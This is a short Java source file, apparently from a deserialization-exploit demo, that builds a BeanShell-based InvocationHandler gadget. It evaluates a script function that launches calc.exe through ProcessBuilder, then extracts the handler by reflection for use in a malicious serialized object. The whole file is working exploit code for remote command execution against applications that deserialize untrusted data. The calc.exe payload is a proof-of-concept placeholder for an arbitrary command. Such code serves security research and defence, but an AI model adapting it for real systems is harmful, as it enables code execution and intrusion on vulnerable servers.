package com.example.Evil;

import bsh.Interpreter;
import bsh.XThis;
import com.example.Utils.ReflectionUtil;

import java.lang.reflect.InvocationHandler;

public class BeanShellCalc {

    public static InvocationHandler getHandler(String name) throws Exception {
        String func = name + "() {new java.lang.ProcessBuilder(new String[]{\"calc.exe\"}).start();return 0;}";
        Interpreter i = new Interpreter();
        i.eval(func);

        XThis xt = new XThis(i.getNameSpace(), i);
        InvocationHandler handler = (InvocationHandler) ReflectionUtil.getField(xt, "invocationHandler");
        return handler;
    }

}
